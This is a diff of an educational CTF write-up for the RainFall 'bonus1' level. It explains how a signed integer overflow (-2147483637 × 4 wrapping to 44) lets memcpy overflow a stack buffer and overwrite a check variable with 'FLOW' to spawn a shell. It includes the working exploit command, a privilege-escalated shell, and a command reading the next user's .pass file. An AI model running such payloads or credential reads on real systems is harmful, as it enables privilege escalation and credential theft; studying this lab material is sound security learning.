@@ -62,7 +62,7 @@ The `main` function first **converts `argv[1]`** to an **integer** using `atoi()
 If `local_14` is **strictly less than 10**, the program calls `memcpy()` to **copy `argv[2]`** into the local buffer `local_3c`.
 The **size** of the copy is calculated as **`local_14 * 4`**.
 
-After the copy, the program checks whether **`local_14`** is **equal** to **`0x574f4c46`** (which corresponds to **`1464814662`** in decimal, or **`"FLOW"`** in ASCII).
+After the `memcpy()`, the program checks whether **`local_14`** has been modified to equal **`0x574f4c46`** (`1464814662` in decimal, or `"FLOW"` in ASCII when interpreted as a string).
 If this condition is met, the program executes `/bin/sh` via `execl()`.
 
 In this branch, the function sets `uVar1` to `0` and returns.
@@ -81,7 +81,7 @@ To bypass it, we can **combine** an **Integer Overflow** with a **Buffer Overflo
 
 The idea is to **exploit the `memcpy()`** call to **overflow `local_3c`** and **overwrite `local_14`**, replacing its value with **`FLOW`**.
 
-However, since `local_14` must be less than 10, the **maximum size** passed to `memcpy()` is:
+However, if we use a **normal positive value** less than 10, the **maximum size** passed to `memcpy()` would be:
 ```m
 
 9 * 4 = 36
@@ -98,12 +98,15 @@ This is where the **Integer Overflow** comes into play.
 An **`int`** is **stored** on **`4 bytes`**, meaning its **value range** is **limited**:
 
 ```
-hex:
-00000000					 80000000					 ffffffff
-    ├───────────────────────────┼───────────────────────────┤
--2147483648                    	0                       2147483647
-int:
+
+hex:			00000000					 80000000					 ffffffff
+					├───────────────────────────┼───────────────────────────┤
+decimal:   		-2147483648                    	0                       2147483647
+					└─ INT_MIN									   INT_MAX ─┘
 ```
+
+**Note:**
+This range is for **signed integers** (which is the default in `C`). The range is from `-2147483648` to `2147483647`. 
 
 When an **integer** exceeds its **maximum value**, it **wraps around**:
 
@@ -115,7 +118,7 @@ When an **integer** exceeds its **maximum value**, it **wraps around**:
 For example:
 ```
 
--2147483649 (int min - 1) = 2147483647
+-2147483649 (INT_MIN - 1) = 2147483647
 ```
 
 In this program, `local_14` is **multiplied by `4`** before being passed to `memcpy()`.
@@ -147,35 +150,76 @@ Therefore the **required copy size** is **44 bytes**.
 
 Then we need to **compute** the **value to provide** in order to **obtain** a copy size of **44 bytes** for `memcpy`.
 
-From the **following base**:
+From the following base, we know that:
 
 ```m
-(int min) -2147483648 * 4 = 0
-
-AND
-
-(-2147483648 + 1) * 4 = 4
+INT_MIN * 4 = -2147483648 * 4 = overflow to 0
 ```
 
-Since we want `memcpy` to copy **`44` bytes**, and the **size is multiplied by `4`**, we get:
+This is because:
+```m
+-2147483648 in binary:	10000000 00000000 00000000 00000000
+* 4 (left shift by 2):	00000000 00000000 00000000 00000000 = 0
+```
 
+---
+
+**Note:**
+
+In binary, multiplying by powers of `2` is equivalent to shifting bits to the left:
+```
+* 2  = left shift by 1 bit   (2^1)
+* 4  = left shift by 2 bits  (2^2)
+* 8  = left shift by 3 bits  (2^3)
+* 16 = left shift by 4 bits  (2^4)
+```
+For example:
+
+```
+In binary:
+5	 	:		00000000 00000000 00000000 00000101
+5 * 2	:		00000000 00000000 00000000 00001010 	= 10
+5 * 4	:		00000000 00000000 00000000 00010100 	= 20
+5 * 8	:		00000000 00000000 00000000 00101000 	= 40
+5 * 16	:		00000000 00000000 00000000 01010000 	= 80
+
+New bits filled with 0.
+```
+
+---
+
+
+We also know that:
+```m
+(INT_MIN + 1) * 4 = (-2147483648 + 1) * 4 
+                  = -2147483647 * 4
+                  = 4
+```
+
+Following this pattern:
+````
+(INT_MIN + n) * 4 = n * 4
+````
+
+Since we need `memcpy` to copy **44 bytes**:
 ```m
 44 / 4 = 11
 ```
 
-This leads to:
-
+This lead to:
 ```m
-(-2147483648 + 11) * 4 = 44
-```
-
-Which gives:
-
-```m
+(INT_MIN + 11) * 4 = 44
 -2147483648 + 11 = -2147483637
 ```
 
 Therefore, the value to provide is **`-2147483637`**.
+
+```bash
+bonus1@RainFall:~$ python -c "print (-2147483637 * 4) & 0xFFFFFFFF"
+44
+```
+
+The `& 0xFFFFFFFF` operation **masks the result to 32 bits**, keeping only the **lower 32 bits** (least significant bits) and discarding any overflow beyond the 32-bit range.
 
 ### Overflow Visualization
 
@@ -184,13 +228,13 @@ Therefore, the value to provide is **`-2147483637`**.
 ### Create the Payload
 
 ```bash
-python -c "print '-2147483637' + ' ' + '\x90' * 40 + '\x46\x4c\x4f\x57'"
+python -c "print '-2147483637' + ' ' + 'a' * 40 + '\x46\x4c\x4f\x57'"
 ```
 
 ## 4. Capture The Flag
 
 ```bash
-bonus1@RainFall:~$ ./bonus1 $(python -c "print '-2147483637' + ' ' + '\x90' * 40 + '\x46\x4c\x4f\x57'")
+bonus1@RainFall:~$ ./bonus1 $(python -c "print '-2147483637' + ' ' + 'a' * 40 + '\x46\x4c\x4f\x57'")
 $ id
 uid=2011(bonus1) gid=2011(bonus1) euid=2012(bonus2) egid=100(users) groups=2012(bonus2),100(users),2011(bonus1)
 $ cat /home/user/bonus2/.pass
